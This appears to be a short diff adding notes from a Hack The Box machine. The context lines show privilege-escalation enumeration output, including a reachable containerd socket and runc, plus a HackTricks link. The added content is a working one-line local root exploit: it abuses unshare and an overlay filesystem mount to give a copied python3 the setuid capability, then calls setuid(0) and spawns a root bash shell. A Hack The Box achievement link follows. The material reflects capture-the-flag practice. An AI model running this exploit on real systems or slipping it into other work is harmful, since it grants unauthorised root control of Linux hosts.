@@ -43,3 +43,11 @@ ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = 
 ╔══════════╣ Checking if runc is available
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                            
 runc was found in /usr/bin/runc, you may be able to escalate privileges with it 
+
+
+
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
+
+
+https://www.hackthebox.com/achievement/machine/458711/569
+
